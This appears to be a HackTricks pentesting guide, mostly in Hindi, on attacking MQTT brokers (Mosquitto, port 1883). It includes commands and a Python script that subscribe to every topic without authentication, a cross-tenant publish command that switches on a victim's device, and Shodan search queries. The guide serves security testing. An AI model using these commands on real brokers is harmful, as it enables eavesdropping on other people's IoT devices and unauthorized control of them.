# 1883 - Pentesting MQTT (Mosquitto)

{{#include ../banners/hacktricks-training.md}}

## बुनियादी जानकारी

**MQ Telemetry Transport (MQTT)** एक **publish/subscribe messaging protocol** के रूप में जाना जाता है जो अपनी अत्यंत सरलता और हल्केपन के लिए विशिष्ट है। यह प्रोटोकॉल उन वातावरणों के लिए विशेष रूप से अनुकूलित है जहाँ डिवाइसों की क्षमताएँ सीमित होती हैं और वे ऐसे नेटवर्क पर कार्य करते हैं जिनमें कम bandwidth, उच्च latency, या अस्थिर कनेक्शन होते हैं। MQTT के मुख्य उद्देश्य नेटवर्क bandwidth के उपयोग को कम करना और डिवाइस संसाधनों पर दबाव घटाना हैं। इसके अलावा, यह विश्वसनीय संचार बनाए रखने और डिलीवरी आश्वासन का एक स्तर प्रदान करने का प्रयास करता है। ये लक्ष्य MQTT को **machine-to-machine (M2M) communication** और **Internet of Things (IoT)** के तेजी से बढ़ते क्षेत्र के लिए विशेष रूप से उपयुक्त बनाते हैं, जहाँ बड़ी संख्या में डिवाइसों को कुशल तरीके से जोड़ा जाना आवश्यक होता है। साथ ही, मोबाइल applications के लिए भी MQTT बहुत फायदेमंद है, जहाँ bandwidth और बैटरी जीवन की बचत महत्वपूर्ण होती है।

**डिफ़ॉल्ट पोर्ट:** 1883
```
PORT     STATE SERVICE                 REASON
1883/tcp open  mosquitto version 1.4.8 syn-ack
```
## ट्रैफ़िक का निरीक्षण

जब MQTT ब्रोकर द्वारा **CONNECT** पैकेट प्राप्त होता है, तो एक **CONNACK** पैकेट वापस भेजा जाता है। इस पैकेट में एक रिटर्न कोड होता है जो कनेक्शन की स्थिति समझने के लिए महत्वपूर्ण होता है। रिटर्न कोड **0x00** का मतलब है कि क्रेडेंशियल स्वीकार कर लिए गए हैं, जो सफल कनेक्शन का संकेत देता है। वहीं, रिटर्न कोड **0x05** संकेत देता है कि क्रेडेंशियल अमान्य हैं, जिससे कनेक्शन रोका जाता है।

उदाहरण के लिए, यदि ब्रोकर अमान्य क्रेडेंशियल के कारण कनेक्शन अस्वीकार कर देता है, तो परिदृश्य कुछ इस तरह दिखाई देगा:
```
{
"returnCode": "0x05",
"description": "Connection Refused, not authorized"
}
```
![](<../images/image (976).png>)

### [**Brute-Force MQTT**](../generic-hacking/brute-force.md#mqtt)

## Pentesting MQTT

**प्रमाणीकरण पूरी तरह वैकल्पिक है** और भले ही प्रमाणीकरण किया जा रहा हो, **डिफ़ॉल्ट रूप से एन्क्रिप्शन उपयोग नहीं किया जाता** (क्रेडेंशियल्स स्पष्ट टेक्स्ट में भेजे जाते हैं). MITM attacks अभी भी पासवर्ड चुराने के लिए किए जा सकते हैं।

To connect to a MQTT service you can use: [https://github.com/bapowell/python-mqtt-client-shell](https://github.com/bapowell/python-mqtt-client-shell) and subscribe yourself to all the topics doing:
```
> connect (NOTICE that you need to indicate before this the params of the connection, by default 127.0.0.1:1883)
> subscribe "#" 1
> subscribe "$SYS/#"
```
आप इसका भी उपयोग कर सकते हैं [**https://github.com/akamai-threat-research/mqtt-pwn**](https://github.com/akamai-threat-research/mqtt-pwn)

आप निम्नलिखित का भी उपयोग कर सकते हैं:
```bash
apt-get install mosquitto mosquitto-clients
mosquitto_sub -t 'test/topic' -v #Subscribe to 'test/topic'
mosquitto_sub -h <host-ip> -t "#" -v #Subscribe to ALL topics.
```
या आप **इस code को चलाकर बिना authentication के MQTT service से connect करने की कोशिश कर सकते हैं, हर topic को subscribe कर सकते हैं और उन्हें सुन सकते हैं**:
```python
#This is a modified version of https://github.com/Warflop/IOT-MQTT-Exploit/blob/master/mqtt.py
import paho.mqtt.client as mqtt
import time
import os

HOST = "127.0.0.1"
PORT = 1883

def on_connect(client, userdata, flags, rc):
client.subscribe('#', qos=1)
client.subscribe('$SYS/index.html#')

def on_message(client, userdata, message):
print('Topic: %s | QOS: %s  | Message: %s' % (message.topic, message.qos, message.payload))

def main():
client = mqtt.Client()
client.on_connect = on_connect
client.on_message = on_message
client.connect(HOST, PORT)
client.loop_start()
#time.sleep(10)
#client.loop_stop()

if __name__ == "__main__":
main()
```
### The Publish/Subscribe Pattern <a href="#b667" id="b667"></a>

पब्लिश/सब्सक्राइब मॉडल में ये घटक होते हैं:

- **Publisher**: ब्रोकर में एक (या कई) topic(s) पर संदेश प्रकाशित करता है।
- **Subscriber**: ब्रोकर में एक (या कई) topic(s) की सदस्यता लेता है और publisher द्वारा भेजे गए सभी संदेश प्राप्त करता है।
- **Broker**: publishers से आने वाले सभी संदेशों को subscribers तक रूट करता है।
- **Topic**: एक या अधिक स्तरों से बनता है जो forward slash से अलग होते हैं (उदा., /smartshouse/livingroom/temperature)।

### Packet Format <a href="#f15a" id="f15a"></a>

हर MQTT पैकेट में एक fixed header होता है (Figure 02).Figure 02: Fixed Header

![https://miro.medium.com/max/838/1*k6RkAHEk0576geQGUcKSTA.png](https://miro.medium.com/max/838/1*k6RkAHEk0576geQGUcKSTA.png)

### Packet Types

- CONNECT (1): क्लाइंट द्वारा सर्वर से कनेक्शन अनुरोध करने के लिए शुरू किया जाता है।
- CONNACK (2): सफल कनेक्शन के लिए सर्वर की पुष्टिकरण प्रतिक्रिया।
- PUBLISH (3): क्लाइंट से सर्वर या सर्वर से क्लाइंट को संदेश भेजने के लिए उपयोग किया जाता है।
- PUBACK (4): एक PUBLISH पैकेट की पुष्टिकरण।
- PUBREC (5): संदेश प्राप्त होने की पुष्टि सुनिश्चित करने वाली संदेश वितरण प्रोटोकॉल का हिस्सा।
- PUBREL (6): संदेश रिलीज़ को संकेत करते हुए संदेश वितरण में और आश्वासन।
- PUBCOMP (7): संदेश वितरण प्रोटोकॉल का अंतिम हिस्सा, पूरा होने का संकेत।
- SUBSCRIBE (8): किसी क्लाइंट का किसी topic के संदेश सुनने का अनुरोध।
- SUBACK (9): SUBSCRIBE अनुरोध के लिए सर्वर की पुष्टिकरण।
- UNSUBSCRIBE (10): किसी क्लाइंट का किसी topic से संदेश प्राप्त करना बंद करने का अनुरोध।
- UNSUBACK (11): UNSUBSCRIBE अनुरोध पर सर्वर की प्रतिक्रिया।
- PINGREQ (12): क्लाइंट द्वारा भेजा गया heartbeat संदेश।
- PINGRESP (13): heartbeat संदेश पर सर्वर की प्रतिक्रिया।
- DISCONNECT (14): कनेक्शन समाप्त करने के लिए क्लाइंट द्वारा आरंभ किया जाता है।
- Two values, 0 and 15, are marked as reserved and their use is forbidden.

## IoT MQTT ecosystem attacks: plaintext brokers and topic ACL bypass

कई consumer IoT प्लेटफॉर्म MQTT brokers एक्सपोज़ करते हैं जिन्हें दो अलग-अलग भूमिकाओं द्वारा उपयोग किया जाता है:
- Gateway/hub devices जो radio protocols (उदा., BLE/LoRa/Zigbee) को cloud से पुल करते हैं।
- Mobile apps या web backends जो “app” topics के माध्यम से डिवाइसेज़ को नियंत्रित करते हैं।

Common weaknesses आप pentest के दौरान दुरुपयोग कर सकते हैं:

- Plaintext MQTT over non-standard ports (e.g., TCP/8001) के बजाय MQTTS का अभाव। किसी भी ऑन-पाथ ऑब्ज़र्वर द्वारा credentials और control frames पढ़े जा सकते हैं। असामान्य पोर्ट्स पर cleartext CONNECT/CONNACK और SUBSCRIBE/PUBLISH ट्रैफिक को पहचानने के लिए Wireshark का उपयोग करें।
- Weak या missing per-tenant topic ACLs। यदि topics केवल deviceId से नामस्थानित हैं (उदा., "/tenantless/<deviceId>/tx"), तो कोई भी authenticated user अन्य tenants के devices पर PUBLISH कर सकता है।
- Sensitive data leakage maintenance/admin topics के माध्यम से (उदा., config बदलने के बाद Wi‑Fi credentials का cleartext में प्रसारण)।

Examples (replace placeholders with real values):

Subscribe to potentially sensitive topics with known topic prefixes and device IDs:
```bash
# Using mosquitto_sub
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
ACLs कमजोर होने पर cross-tenant नियंत्रण (दूसरे tenant के device topic पर publish करना):
```bash
mosquitto_pub -h <app-broker> -p <port> -V mqttv311 \
-i <your_client_id> -u <your_username> -P <your_password> \
-t "/ys/<victimDeviceId>/tx" \
-m '{"method":"Device.setState","params":{"state":{"power":"on"}},"targetDevice":"<victimDeviceId>"}'
```
## Shodan

- `port:1883 MQTT`
- MQTT प्लेनटेक्स्ट गैर-मानक पोर्ट्स पर IoT में सामान्य है। वैकल्पिक पोर्ट्स पर ब्रोकरों की खोज करने पर विचार करें और प्रोटोकॉल डिटेक्शन से पुष्टि करें।

## References

- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

{{#include ../banners/hacktricks-training.md}}
